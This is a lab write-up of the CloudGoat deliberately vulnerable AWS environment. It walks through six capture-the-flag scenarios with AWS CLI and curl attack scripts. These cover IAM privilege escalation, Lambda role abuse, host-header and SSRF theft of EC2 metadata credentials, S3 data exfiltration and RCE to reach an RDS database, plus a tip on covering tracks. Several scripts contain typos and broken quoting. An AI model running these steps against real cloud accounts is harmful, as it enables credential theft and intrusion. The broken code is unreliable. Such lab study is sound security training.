---
title: Lab - CloudGoat [Level 1 - Level 8]
date: 2021-01-24 11:11:11 -0400
categories: [Lab, CTF]
tags: [Lab, CTF, CloudGoat]
---

[toc]

---


# CloudGoat (☁️🐐)


_CloudGoat is Rhino Security Labs' "Vulnerable by Design" AWS deployment tool._

<p align="center">
  <img src="https://rhinosecuritylabs.com/wp-content/uploads/2018/07/cloudgoat-e1533043938802-1140x400.jpg" width=350/>
</p>


> CloudGoat is Rhino Security Labs' "Vulnerable by Design" AWS deployment tool.
> It allows you to hone your cloud cybersecurity skills by creating and completing several "capture-the-flag" style scenarios.
> Each scenario is composed of AWS resources arranged together to create a structured learning experience.

Before proceed
> **Warning #1:** CloudGoat creates intentionally vulnerable AWS resources into your account. DO NOT deploy CloudGoat in a production environment or alongside any sensitive AWS resources.
> **Warning #2:** CloudGoat can only manage resources it creates. If you create any resources yourself in the course of a scenario, you should remove them manually before running the `destroy` command.

---

## Requirements

* Linux or MacOS. Windows is not officially supported.
  * Argument tab-completion requires bash 4.2+ (Linux, or OSX with some difficulty).
* Python3.6+ is required.
* Terraform 0.12 [installed and in your $PATH](https://learn.hashicorp.com/terraform/getting-started/install.html).

    ```bash
    brew tap hashicorp/tap
    brew install hashicorp/tap/terraform
    brew upgrade hashicorp/tap/terraform
    terraform -install-autocomplete
    ```

* The AWS CLI [installed and in your $PATH](https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-install.html), and an AWS account with sufficient privileges to create and destroy resources.

---


## install

```bash
$ git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
$ cd cloudGoat
$ pip3 install -r ./core/python/requirements.txt
$ chmod u+x cloudgoat.py

# run some quick configuration commands
$ ./cloudgoat.py config profile
$ ./cloudgoat.py config whitelist --auto
```

Now, at your command, CloudGoat can `create` an instance of a scenario in the cloud.
- When the environment is ready, a new folder will be created in the project base directory named after the scenario and with a unique scenario ID appended.
- Inside this folder will be a file called `start.txt`, which will contain all of the resources you'll need to begin the scenario, though these are also printed to your console when the `create` command completes.
- Sometimes an SSH keypair named `cloudgoat`/`cloudgoat.pub` will be created as well.

When you are finished with the scenario
- delete any resources you created yourself (remember: CloudGoat can only manage resources it creates)
- then run the `destroy` command.
- take a quick glance at AWS web-console afterwards - in case something didn't get deleted.

You can read the full documentation for CloudGoat's commands [here in the Usage Guide section].


---


## use CloudGoat's Docker image

[![Try in PWD](https://github.com/play-with-docker/stacks/raw/cff22438cb4195ace27f9b15784bbb497047afa7/assets/images/button.png)](http://play-with-docker.com?stack=https://raw.githubusercontent.com/RhinoSecurityLabs/cloudgoat/master/docker_stack.yml)

```bash
# Option 1: Run with default entrypoint
$ docker run -it rhinosecuritylabs/cloudgoat:latest

# Option 2: Run with AWS config and credentials
$ docker run -it -v ~/.aws:/root/.aws/ rhinosecuritylabs/cloudgoat:latest
# Running this command will mount your local AWS configuration files into the Docker container when it is launched.
# any user with access to the container will have access to the host computers AWS credentials.
```

---

## Scenarios Available

---


### Scenarios 1: iam_privesc_by_rollback (Small / Easy)

| ++             | ++                                                          |
| -------------- | ----------------------------------------------------------- |
| Scenario Goal  | Acquire full admin privileges.                              |
| Size           | Small                                                       |
| Difficulty     | Easy                                                        |
| Command        | `$ ./cloudgoat.py create iam_privesc_by_rollback`           |
| lesson learned | <font color=red> iam:SetDefaultPolicyVersion </font> can lead to serious security issues, user can roll-back to any version, If any of these versions have additional permissions, then it is a privilege escalation and the severity depends on the additional permissions.


![68747](https://i.imgur.com/8MZEA2V.png)


Starting with a highly-limited IAM user,
- the attacker is able to review previous IAM policy versions
- and restore one which allows full admin privileges,
- resulting in a privilege escalation exploit.


```bash
# ------------- 1. have a set of AWS credentials
# create a named profile with the security credentials using AWS CLI.
aws configure \
    --profile raynor


# ------------- 2. identity who the security credentials belong to
# got the userId, account, Arn(accountID+IAMusername)
aws sts get-caller-identity \
    --profile raynor


# ------------- 3. enumerate the permissions of the services in the AWS account.
# Scout Suite, enumerate-iam etc.
# - brute force AWS API calls
# - to determine which API calls are allowed for a given set of security credentials.



# ------------- 3. enumerate Inline Policies and Managed Policies of IAM user "Raynor"
# When evaluating security of an IAM identity (users, groups of users, or roles), enumerating policies and permissions is an essential step.

# analyzes Raynor's privileges
# got the policyARN
# A "Customer Managed Policy" cg-raynor-policy is attached directly to the IAM user "Raynor".
aws iam list-attached-user-policies \
    --user-name raynor \
    --profile raynor

# enumerate the customer managed policy "cg-raynor-policy "
# --only-attached : extract only attached policies and "scope" as Local to only extract customer managed policies.
# -query : extract only information related to cg-raynor-policy.
# Notice that the default version is v1.
aws iam list-policies \
    --only-attached --scope Local \
    --query "Policies[?starts_with(PolicyName, 'cg')]" \
    --profile scenario1



# ------------- 4. reviewing the old versions policy
aws iam get-policy-version \
    --policy-arn <generatedARN>/cg-raynor-policy \
    --version-id <versionID> \
    --profile raynor
# one version offers a full set of admin rights.
# the IAM identity with the policy is allowed to
# - perform any IAM "Get" or "List" operations against any resource.
# - one "Set" operation, iam:SetDefaultPolicyVersion, is allowed against any resource.
# iam:SetDefaultPolicyVersion is allowed can lead to serious security issues.



# ------------- 5. review previous IAM policy versions
# check if there are other versions of the customer managed policy cg-raynor-policy.
# there can be up to 5 versions of the policy.
aws iam list-policy-versions \
    --policy-arn <generatedARN>/cg-raynor-policy \
    --profile raynor


aws iam get-policy-version \
    --policy-arn <generatedARN>/cg-raynor-policy \
    --version-id <versionID> \
    --profile raynor


# restore the one which allows full admin privileges,
aws iam set-default-policy-version \
    --policy-arn <generatedARN>/cg-raynor-policy \
    --version-id v5 \
    --profile raynor


# As a final step, may choose to revert Raynor's policy version back to the original one,
# thereby concealing the actions and the true capabilities of the IAM user.

# Destroy the scenario resources
python3 cloudgoat.py destroy iam_privesc_by_rollback
```



---


### Scenarios 2: lambda_privesc (Small / Easy)

| ++             | ++                                       |
| -------------- | ---------------------------------------- |
| Scenario Goal  | Acquire full admin privileges.           |
| Size           | Small                                    |
| Difficulty     | Easy                                     |
| Command        | `$ ./cloudgoat.py create lambda_privesc` |
| lesson learned | <font color=red> sts:AssumeRole + Lambda:* </font> able to change the assume role policy document of any existing role to allow them to assume that role. It returns a set of temporary security credentials that you can use to access AWS resources that you might not normally have access to. |


![68747470733a2f2f6170702e6c7563696463686172742e636f6d2f7075626c69635365676d656e74732f766965772f66316237613734392d646565302d343634352d623330352d6164643261303235623963632f696d6167652e706e67](https://i.imgur.com/iam6d77.png)

Starting as the IAM user Chris
-  discovers that they can assume a role that has full Lambda access and pass role permissions.
-  then perform privilege escalation using these new permissions to obtain full admin privileges.



```bash
#!/bin/bash

# A python2 utility “crudini”
pip2 install — user crudini
# jq — awesome json processor
brew install jq


#set command line parameters
INFILE=~/.aws/credentials

SRC_PROFILE='chris'
AWS_ACCESS_KEY_ID=$1
AWS_SECRET_ACCESS_KEY=$2
AWS_REGION='us-east-1'

# ------------- 1. Deploying the resources gives us the access key and secret key for Chris:


# ------------- 2. create a profile with the security credentials using AWS CLI.
# aws configure \
#     --profile $SRC_PROFILE
echo "[$SRC_PROFILE]
REGION = $AWS_REGION
AWS_ACCESS_KEY_ID = $AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY = $AWS_SECRET_ACCESS_KEY
" | crudini --merge $INFILE
echo "Set creds for profile $PROFILE in $INFILE"


# got the userId, account, Arn(accountID+IAMusername)
# aws sts get-caller-identity \
#     --profile $SRC_PROFILE
IDENTITY=`aws iam get-user \
			--profile $PROFILE`
USERNAME=`echo $IDENTITY | jq -r .UserName`
echo "-------profile $PROFILE 's user name is $USERNAME"



# ------------- 3. Enumerate the policies and permissions attached
# Lists inline policies
InPolicy='aws iam list-user-policies \
            –-user-name $USERNAME \
            –-profile $SRC_PROFILE '
# Lists managed policies
AWSPolicy='aws iam list-attached-user-policies \
            –-user-name $USERNAME \
            –-profile $SRC_PROFILE'
AWSPolicyArn=`echo $AWSPolicy | jq -r .AttachedPolicies[].PolicyArn`



# ------------- 4. Get info on the managed policy
# get version
AWSPolicyInfo='aws iam get-policy \
                -–policy-arn $AWSPolicyArn \
                -–profile $SRC_PROFILE '
AWSPolicyVer=`echo $AWSPolicy | jq -r .Policy.DefaultVersionId`


# Review details of the policy
aws iam get-policy-version \
    -–policy-arn $AWSPolicyArn \
    -–version-id $AWSPolicyVer \
    -–profile $SRC_PROFILE
# this policy has sts:AssumeRole allowed




# ------------- 5. Get nformation about the roles:
# Review details of the policy attached
# two roles assigned to the user: “cg-debug-role-cgidpqw7rhl92u” and “cg-lambdaManager-role-cgidpqw7rhl92u”.
IAMRolesInfo='aws iam list-roles \
            -–profile $SRC_PROFILE'
AWSRoleName=`echo $IAMRolesInfo | jq -r .Roles[.RoleName]`

DebugRole='cg-debug-role-cgidpqw7rhl92u'
LambdaRole='cg-lambdaManager-role-cgidpqw7rhl92u'


DebugRolePolicy='aws iam list-attached-role-policies \
                    –-role-name $DebugRole
                    -–profile $SRC_PROFILE'
DebugRolePolicyArn=`echo $DebugRolePolicy | jq -r .AttachedPolicies[].PolicyArn`
# The DebugRole role has AdministratorAccess policy
aws sts assume role \
    -–role-arn $DebugRolePolicyArn
    –-role-session-name debug_role_session
    -–profile $SRC_PROFILE
# assume the debug role
# access is denied because Chris is not authorized to assume the role.


LambdaRolePolicy='aws iam list-attached-role-policies \
                    –-role-name $LambdaRole
                    -–profile $SRC_PROFILE'
LambdaRolePolicyArn=`echo $LambdaRolePolicy | jq -r .AttachedPolicies[].PolicyArn`
# The LambdaRole role has lambdaManager policy
# Get more information on the managed policy attached to the IAM role:
LambdaRolePolicyInfo='aws iam get-policy \
                        -–policy-arn $LambdaRolePolicyArn \
                        -–profile $SRC_PROFILE'
LambdaRolePolicyVer=`echo $LambdaRolePolicyInfo | jq -r .Policy.DefaultVersionId`

LambdaRolePolicy='aws iam get-policy-version \
                    -–policy-arn $LambdaRolePolicyArn \
                    -–version-id $LambdaRolePolicyVer \
                    -–profile $SRC_PROFILE '
echo "$LambdaRolePolicy"
# this policy has iam:PassRole, lambda:CreateFunction and lambda:InvokeFunction permissions
# can escalate privileges by passing an existing IAM role to new Lambda function that includes code
# - to import the relevant AWS library to their programming language of choice,
# - then using it perform actions of their choice.
# The code could then be run by invoking the function through the AWS API.
# This would give a user access to the privileges associated with any Lambda service role that exists in the account, from no privilege escalation to full administrator access to the account.


LambdaRoleSession='aws sts assume role \
                    -–role-arn $LambdaRole
                    –-role-session-name lambdaManager_role_session
                    -–profile $SRC_PROFILE'
# assume the lambdaManager role
# action was successful because Chris is authorized to assume the role.
# granted the temporary credential of the role (i.e., access key ID, secret access key and session token).





# ------------- 6. Configure the IAM credential on AWS CLI:
# aws configure -–profile lambdaManager
LambdaROFILE='lambdaManager'
LambdaRole_AWS_ACCESS_KEY_ID=`echo $LambdaRoleSession | jq -r .Credentials.AccessKeyId`
LambdaRole_AWS_AWS_SECRET_ACCESS_KEY=`echo $LambdaRoleSession | jq -r .Credentials.SecretAccessKey`
LambdaRole_AWS_SESSION_TOKEN=`echo $LambdaRoleSession | jq -r .Credentials.SessionToken`

echo "[$LambdaROFILE]
REGION = $AWS_REGION
AWS_ACCESS_KEY_ID = $LambdaRole_AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY = $LambdaRole_AWS_AWS_SECRET_ACCESS_KEY
AWS_SESSION_TOKEN = $LambdaRole_AWS_SESSION_TOKEN
" | crudini --merge $INFILE
echo "Set creds for profile $PROFILE in $INFILE"


# ------------- 7. Create a Lambda function
# Lambda: attach the administrator policy to the IAM user – Chris:
import boto3
def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(UserName ='$USERNAME', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
    return response
# Save the file as lamba_function.py and zip it.


# Run this command:
# using the lambdaManager role to create a Lambda function, and set the lambda execution role to the debug role.
aws lambda create-function \
    -–function-name admin_function \
    -–runtime python 3.6 \
    -–role $DebugRolePolicyArn \
    -–handler lambda_function.lambda.handler –zip-file fileb://lamba_function.zip \
    -–profile $LambdaROFILE \
    -—region $AWS_REGION

# Invoke the Lambda function created. If successful, it will return a status code of 200.
aws lambda invoke \
    -–function-name admin_function output.txt \
    -–profile $LambdaROFILE \
    -—region $AWS_REGION


# ------------- 8. Confirm if the IAM user – Chris has the new role attached to his profile:
aws iam list-attached-user-policies \
    –-user-name $USERNAME \
    -–profile $SRC_PROFILE


# ------------- 9. To destroy the resources created during this lab:
./cloudgoat.py destroy lambda_privesc


```



---


### Scenarios 3: cloud_breach_s3 (Small / Moderate)

| ++             | ++                                       |
| -------------- | ---------------------------------------- |
| Scenario Goal  | Acquire full admin privileges.           |
| Size           | Small                                    |
| Difficulty     | Easy                                     |
| Command        | `$ ./cloudgoat.py create cloud_breach_s3` |
| lesson learned | <font color=red> misconfigured reverse-proxy server </font>  `curl http://$EC2IP/latest/meta-data/iam/security-credentials -H ‘Host: 169.254.169.254’` |


> Introduction
> This scenario is inspired by the Capital One breach.
> 2019, a bad actor accessed data stored in AWS S3 buckets owned by Capital One and posted the exfiltrated data on GitHub. The bad actor gained access to the S3 bucket by exploiting a misconfigured AWS service (in this case it seems to be a firewall) to run commands on the Elastic Cloud Compute (EC2) Instance.
> In addition, the EC2 Instance also had an Identity and Access Management (IAM) role assigned, which allowed anyone who had access to the server to access AWS resources such as the AWS S3 buckets.

![scenario2-11](https://i.imgur.com/g2n9m9R.png)


Starting as an anonymous outsider with no access or privileges
- exploit a misconfigured reverse-proxy server
- to query the EC2 metadata service and acquire instance profile keys.
- Then, use those keys to discover, access, and exfiltrate sensitive data from an S3 bucket.

---

#### IMDSv1

Reverse proxy server
- such a Nginx or Traefik etc
- retrieves resources on behalf of a client/resource from one or more servers.
- the reverse proxy server is set up in a way that anyone can set the host header to call the instance metadata API and obtain the credentials.
- The instance metadata contains data about the EC2 instance that can use to configure or manage the running instance.
- When an HTTP request is made to the proxy server, it contains instructions to the host.
- reverse-proxy or application layer "edge router" forward the requests to appropriate service based on the Host header in HTTP requests.

- A bad actor can manipulate the host header
  - to fetch other data on the proxy server such as the IAM credential.
  - exploit reverse-proxy server with overly permissive configuration
  - to reach internal applications that we can't reach otherwise.
  - gets even more severe in cloud resources because of "Instance Metadata".
    - EC2 instance metadata service (IMDS)
    - Instance metadata is data about your instance that use to configure or manage the running instance.
    - Instance metadata can be accessed at the IP address 169.254.169.254, a link-local address and is valid only from the instance.


```bash
#!/bin/bash
INFILE=~/.aws/credentials
AWS_REGION='us-east-1'


# ------------- 1. deploy the resources for each scenario on AWS
./cloudgoat.py create cloud_breach_s3
# starts with the IP address of an AWS EC2 instance with a misconfigured reverse proxy.
# got the accountID and EC2 IP
EC2IP='34.228.232.48'
# the service on port 80 of the IP address is acting as a reverse-proxy server.
namp 34.228.232.48


# ------------- 2.  use curl to do a HTTP request to the EC2 Instance
# exploit the reverse-proxy server to reach out to EC2 instance metadata service (IMDS).
# using curl HTTP client to make a HTTP request to retrieve metadata
# manipulate the host header
# - add a "Host" header whose value points to IP address of IMDS service.
# - to fetch other data on the proxy server such as the IAM credential associated with the instance running.
# If the reverse-proxy server has overly permissive configuration
# - the request will be forwarded to IMDS service
# - and it will return some metadata related information.
# reveals that the instance is acting as a reverse proxy server.

IPV4=`curl -s http://$EC2IP/latest/meta-data/local-ipv4 -H 'Host:169.254.169.254'`
# 10.10.10.238
# evident that the reverse-proxy server has overly permissive configuration to access AWS EC2 IMDS.

IAMROLENAME=`curl http://$EC2IP/latest/meta-data/iam/security-credentials -H ‘Host: 169.254.169.254’`
# cg-backing-WAF-Role-cgidppobj072co

# Use a curl to get more information about the IAM role.
IAMROLEINFO=`curl http://$EC2IP/latest/meta-data/iam/security-credentials/$IAMROLENAME -H ‘Host: 169.254.169.254’`
# This command returns the access key ID, secret access key and the session token of the IAM instance profile attached to the EC2 Instance. This credential is a temporary one, as it has an expiration date.
TEMROFILE='lambdaManager'
TEMROFILE_AWS_ACCESS_KEY_ID=`echo $IAMROLEINFO | jq -r .AccessKeyId`
TEMROFILE_AWS_AWS_SECRET_ACCESS_KEY=`echo $IAMROLEINFO | jq -r .SecretAccessKey`
TEMROFILE_AWS_SESSION_TOKEN=`echo $IAMROLEINFO | jq -r .Token`
# Configure the IAM credential on AWS CLI
# aws configure –profile <insert profile name here>
echo "[$TEMROFILE]
REGION = $AWS_REGION
AWS_ACCESS_KEY_ID = $TEMROFILE_AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY = $TEMROFILE_AWS_AWS_SECRET_ACCESS_KEY
AWS_SESSION_TOKEN = $TEMROFILE_AWS_SESSION_TOKEN
" | crudini --merge $INFILE
echo "Set creds for profile $TEMROFILE in $INFILE"



# ------------- 3. use enumerate-iam script to quickly verify the role permissions.
python enumerate-iam.py \
    --access-key $TEMROFILE_AWS_ACCESS_KEY_ID \
    --secret-key $TEMROFILE_AWS_AWS_SECRET_ACCESS_KEY \
    --session-token $TEMROFILE_AWS_SESSION_TOKEN


# ------------- 4. List the s3 bucket
# list the buckets
aws s3 ls \
    -–profile $TEMROFILE
# copy the files from the s3 bucket to a new folder.
aws s3 sync s3://BUCKET-NAME ./datafile \
    -–profile $TEMROFILE

cd ./datafile
head cardholder_data_primary.csv



# ------------- 4. destroy the resources created during this lab:
./cloudgoat.py destroy cloud_breach_s3


```

---


#### IMDSv2

IMDSv1
- has been widely exploited using web application vulnerabilities in web applications running on EC2 to gain access to IAM credentials.
- such as Server Side Request Forgery (SSRF), Command Injection etc
- AWS released an update to <font color=red> EC2 instance metadata service </font> for querying instance metadata values.

IMDSv2
- a defence in depth
- against open firewalls and SSRF vulnerabilities.
- IMDSv2 needs a session token for making any request to the service.
- This token can only be obtained by making a specific request using the HTTP PUT method.
- [IMDSv2](https://blog.appsecco.com/getting-started-with-version-2-of-aws-ec2-instance-metadata-service-imdsv2-2ad03a1f3650)

Although IMDSv2 effectively mitigates most SSRF attacks
- it still cannot mitigate security issues like mis-configured reverse-proxy servers such as the one we exploited.


```bash
# -------- 1. setup
# upgrade the vulnerable EC2 instance from IMDSv1 to IMDSv2.
# need the latest AWS CLI ( >=1.16.287) that supports IMDSv2.
# using cloudgoat profile (Admin user) to update EC2 instance from IMDSv1 to IMDSv2.

pip3 install awscli
pip3 upgrade awscli

aws ec2 modify-instance-metadata-options \
    --instance-id <INSTANCE-ID> \
    --profile cloudgoat \
    --http-endpoint enabled \
    --http-token required


# -------- 2. exploit IMDS v2 using the mis-configured reverse proxy.
# generate the token for accessing metadata endpoint with the below HTTP PUT request

TOKEN=`curl -X PUT 'http://54.196.109.217/latest/api/token' \
        --H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' \
        --H 'Host:169.254.169.254' `

# use the security token obtained as part of the HTTP request header.
curl -s http://$EC2IP/latest/meta-data/local-ipv4 \
    --H 'X-aws-ec2-metadata-token:$TOKEN' \
    --H 'Host:169.254.169.254'
# 10.10.10.238



# -------- 3. destroy the resources created during this lab:
./cloudgoat.py destroy cloud_breach_s3
```



---



### Scenarios 4: iam_privesc_by_attachment (Medium / Moderate)


| ++             | ++                                       |
| -------------- | ---------------------------------------- |
| Scenario Goal  | deleting the `cg-super-critical-security-server`            |
| Size           | Medium                                    |
| Difficulty     | Moderate                                     |
| Command        | `$ ./cloudgoat.py create iam_privesc_by_attachment` |
| lesson learned | <font color=red> check role, create ec2, swap role, terminate other service </font> |


Starting with a very limited set of permissions
- leverage the instance-profile-attachment permissions to create a new EC2 instance with significantly greater privileges than their own.
- With access to this new EC2 instance, the attacker gains full administrative powers within the target account and is able to accomplish the scenario's goal
  - deleting the `cg-super-critical-security-server`
  - and paving the way for further nefarious actions.


![6874](https://i.imgur.com/n9sGgxH.png)


```bash
# got the IAM User "Kerrigan"
# uses their limited privileges to explore the environment.
aws configure --profile Kerrigan


# lists EC2 instances
# identifying the "cg-super-critical-security-server"
# unable to directly affect the target
aws ec2 describe-instances \
    --profile Kerrigan

aws iam list-instance-profiles \
    --profile Kerrigan



# enumerate existing instance profiles and roles within the account
# identifying an instance profile they can use and a promising-looking role.
# swap the full-admin role onto the instance profile.

aws iam list-roles \
    --profile Kerrigan

aws iam remove-role-from-instance-profile \
    --instance-profile-name cg-ec2-meek-instance-profile-<cloudgoat_id> \
    --role-name cg-ec2-meek-role-<cloudgoat_id> \
    --profile Kerrigan

aws iam add-role-to-instance-profile \
    --instance-profile-name cg-ec2-meek-instance-profile-<cloudgoat_id> \
    --role-name cg-ec2-mighty-role-<cloudgoat_id> \
    --profile Kerrigan



# creates a new EC2 key pair.
aws ec2 create-key-pair \
    --key-name pwned \
    --profile Kerrigan


# creates a new EC2 instance with that keypair
aws ec2 describe-subnets \
    --profile Kerrigan

aws ec2 describe-security-groups \
    --profile Kerrigan

aws ec2 run-instances \
    --image-id ami-0a313d6098716f372 \
    --iam-instance-profile Arn=<instanceProfileArn> \
    --key-name pwned \
    --profile kerrigan \
    --subnet-id <subnetId> \
    --security-group-ids <securityGroupId>


# now have shell access to it.
sudo apt-get update
sudo apt-get install awscli

aws ec2 describe-instances \
    --region us-east-1



# attaches the full-admin-empowered instance profile to the EC2 instance.


# By accessing and using the new EC2 instance as a staging platform
# execute AWS CLI commands with full admin privileges granted by the attached profile's role.


# terminate the "cg-super-critical-security-server" EC2 instance, completing the scenario.

aws ec2 terminate-instances \
    --instance-ids <instanceId> \
    --region us-east-1

```









---


### Scenarios 5: ec2_ssrf (Medium / Moderate)


| ++             | ++                                       |
| -------------- | ---------------------------------------- |
| Scenario Goal  | Invoke the `cg-lambda-[ CloudGoat ID ]` Lambda function  |
| Size           | Medium                                    |
| Difficulty     | Moderate                                     |
| Command        | `$ ./cloudgoat.py create ec2_ssrf` |
| lesson learned | <font color=red> found credentials in the environment variables for a Lambda Function > discovered an EC2 instance hosting a website > exploiting the web application, gain credentials by querying the internal metadata API. </font> |


Starting as the IAM user Solus
- have ReadOnly permissions to a Lambda function, where hardcoded secrets lead them to an EC2 instance running a web application that is vulnerable to server-side request forgery (SSRF).
- After exploiting the vulnerable app and acquiring keys from the EC2 metadata service, the attacker gains access to a private S3 bucket with a set of keys that allow them to invoke the Lambda function and complete the scenario.


![6874](https://i.imgur.com/F3N3Bqh.png)



```bash
# Pacu a cloud pentest framework and run the install script.
git clone https://github.com/RhinoSecurityLabs/pacu
sh pacu/install.sh


# launch the scenario.
# ./ec2_ssrf_<id >/start.txt contains the initials credentials for the user solus.
# add these keys into Pacu to begin enumerating.
aws configure --profile cloudgoat
python3 cloudgoat.py create ec2_ssrf --profile cloudgoat.



# ----------- 1. Enumerating IAM and Lambda
# As the IAM user Solus
# explores the AWS environment and discovers they can list Lambda functions in the account.
# Looking through the function’s configuration, access keys stored in the function’s environment variables.
# Environment variables are a common area to find secrets in many services in AWS including Lambdas.
aws lambda list-function \
    --profile solus


# Within a Lambda function, the attacker finds AWS access keys belonging to a different user.
aws configure --profile cglambda


# discovers an EC2 instance
aws ec2 describe-instances --profile cglambda

Go to http://<EC2 instance IP>



# ----------- 2. Exploiting SSRF for AWS Metadata Access
# running a web application vulnerable to a SSRF vulnerability.
# Exploiting the SSRF vulnerability via the ?url=... parameter
# to hit the EC2 instance metadata
# to steal AWS keys from the EC2 metadata service.
# Every EC2 instance has access to internal aws metadata by calling a specific endpoint from within the instance.
# - The metadata contains information and credentials used by the instance.
# - use those credentials to possibly escalate our privileges
http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<the role name>

# Add the EC2 instance credentials
[ec2role]
aws_access_key_id = asdasdasd
aws_secret_access_key = asdasdsadas
aws_session_token = "asdasdasd"




# ----------- 3. Pivoting into S3 Buckets
# finds a private S3 bucket containing another set of AWS credentials for a more powerful user: Shepard.
aws s3 ls --profile cgec2role

aws s3 ls --profile cgec2role s3://cg-secret-s3-bucket-<cloudgoat_id>

aws s3 cp --profile cgec2role s3://cg-secret-s3-bucket-<cloudgoat_id>/admin-user.txt ./

cat admin-user.txt



# ----------- 4. Compromising Scenario Flag
# Now operating as Shepard,
aws configure --profile cgadmin
# with full-admin final privileges, invoke the original Lambda function to complete the scenario.
aws lambda list-functions --profile cgadmin

aws lambda invoke --function-name cg-lambda-<cloudgoat_id> ./out.txt

cat out.txt



```

![web-edit-2-750x375](https://i.imgur.com/26kG2BG.png)



---


### Scenarios 6: rce_web_app (Medium / Hard)


| ++             | ++                                       |
| -------------- | ---------------------------------------- |
| Scenario Goal  | get the SSH keys which grant direct access to the EC2  |
| Size           | Medium                                    |
| Difficulty     | Hard                                     |
| Command        | `$ ./cloudgoat.py create rce_web_app` |

lesson learned:
1. Access to the <font color=red> elastic load balancer log files </font>
   - which led to the secret URL. (should be restricted to a need-to-know basis)
2. Remote code execution vulnerability on the web application
   - which allowed to run commands on the EC2 Instance as root granting us access to sensitive information.
3. Access to the <font color=red> user data in the EC2 instance </font>
   - which granted us access to the RDS Instance.
4. weak credential manage
   - SSH keys were stored in an S3 bucket and used to gain access to the EC2 instance.
   - Credentials (user name and password) to the RDS instance were stored in a text file.


Starting as the IAM user Lara
- explores a Load Balancer and S3 bucket for clues to vulnerabilities,
- leading to an RCE exploit on a vulnerable web app
- exposes confidential files and culminates in access to the scenario’s goal: a highly-secured RDS database instance.

Alternatively
- may start as the IAM user McDuck and enumerate S3 buckets,
- eventually leading to SSH keys which grant direct access to the EC2 server and the database beyond.


![687467](https://i.imgur.com/x8NbBiD.png)





#### Lara’s path

1. recon

```bash
#set command line parameters
INFILE=~/.aws/credentials


# ------------- 1. Deploying the resources gives us the access key and secret key
SRC_PROFILE='Lara'
AWS_ACCESS_KEY_ID='xxx'
AWS_SECRET_ACCESS_KEY='yyy'
AWS_REGION='us-east-1'
# aws sts get-caller-identity --profile $SRC_PROFILE
USE_RNAME='lara'


# ------------- 2. create a profile
# aws configure --profile $SRC_PROFILE
echo "[$SRC_PROFILE]
REGION = $AWS_REGION
AWS_ACCESS_KEY_ID = $AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY = $AWS_SECRET_ACCESS_KEY
" | crudini --merge $INFILE
echo "Set creds for profile $SRC_PROFILE in $INFILE"



# ------------- 3. enumerating the policies and permissions
# see what privileges the user has
# python enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY
aws iam list-user-policies \
    --user-name $USE_RNAME \
    --profile $SRC_PROFILE

aws iam list-attached-user-policies
    --user-name $USE_RNAME \
    --profile $SRC_PROFILE

aws iam list-roles
    --profile $SRC_PROFILE


# lists S3 buckets
# discovering one which contains the logs for the Load Balancer.
aws s3 ls \
    --profile $SRC_PROFILE

aws s3 ls s3://<bucket> \
    --recursive \
    --profile $SRC_PROFILE

aws s3 cp s3://<bucket>/cg-lb-logs/AWSLogs/793950739751/elasticloadbalancing/us-east-1/2019/06/19/555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log . \
    --profile $SRC_PROFILE
```



2. investigate the elb log


```bash
# ------------- 4. reviewing the contents of the logs
# discovers a web application hosted behind a elb, secured Load Balancer.
# the log file reveals it is an HTTP log file
# the web app has a secret admin page.
cat 555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log

# ------------- two ways to analyze this log file.
# 1. Using grep to find and extract URLs from the log file.
cat <insert file name here> | grep -Eo ‘(http|https)://[a-zA-Z0-9./?=_%:-]*’
# http://cg-lb-cgidp347lhz47g.accounid.us-east-1.elb.amazon.com:80:xxxxx

# 2. Using an ELB log analyzer: log analyzer for AWS Elastic Load Balancer by Ozantunca on GitHub
elb-log-analyzer <insert log name here>
# 1 - 9 - http://cg-lb-cgidp347lhz47g.accounid.us-east-1.elb.amazon.com:80:xxxxx
# try accessing the webpage, as it has been accessed multiple times via different ELBs. It is unavailable.


# identify whether there’s a load balancer or EC2 instance deployed and if we have access to it.
aws ec2 describe-load-balancers \
    –-region $AWS_REGION \
    -–profile $SRC_PROFILE
# not sure what kind of elastic load balancer is deployed
# assume it’s an application load balancer, since a web server deployed on the EC2 instance (port 80 is enabled on the server).
ELBINFO=`aws elbv2 describe-load-balancers \
            –-region $AWS_REGION \
            -–profile $SRC_PROFILE`
DNSNAME=`echo $ELBINFO | jq -r .LoadBalancers[].DNSName`
# cg-lb-cgidp347lhz47g-accounid.us-east-1.elb.amazon.com
```


3. visit the secret admin URL

```bash
# visit the public IP address of the elastic load balancer. It references a secret URL.
curl $DNSNAME

# visit the secret admin URL (the .html webpage identified in the ELB log file)
cg-lb-cgidp347lhz47g-accounid.us-east-1.elb.amazon.com:80:xxxxx

# try different commands.
# the web app is vulnerable to a remote code execution (RCE) attack via a secret parameter embedded in a form.
# and the commands are running as root.


# query the instance metadata API to obtain the credentials to reveal the role name of the EC2 instance.
# The instance metadata contains data about the EC2 instance that you can use to configure or manage the running instance.
curl http://169.254.269.254/latest/meta-data/iam/security-credentials
curl http://169.254.269.254/latest/meta-data/iam/security-credentials/role-name
# querying the user data to see if there were any user data specified during the creation of the EC2 instance.
# all the command history, discovers the RDS database credentials and address.
curl http://169.254.169.254/latest/user-data

# The user data contains commands and credentials to the RDS instance (with table “sensitive information”).
# access the RDS database using the credentials they found and acquires the scenario's goal: the secret text stored in the RDS database
psql postgresql://<db_user>:<db_password>@<rds-instance>:5432/<db_name>
# cloudgoat ->
# cloudgoat ->\dt
# cloudgoat ->select * from sensitive_information;
```


![012821-15-768x510](https://i.loli.net/2021/02/02/NlPfOEBxtuiAWY1.png)

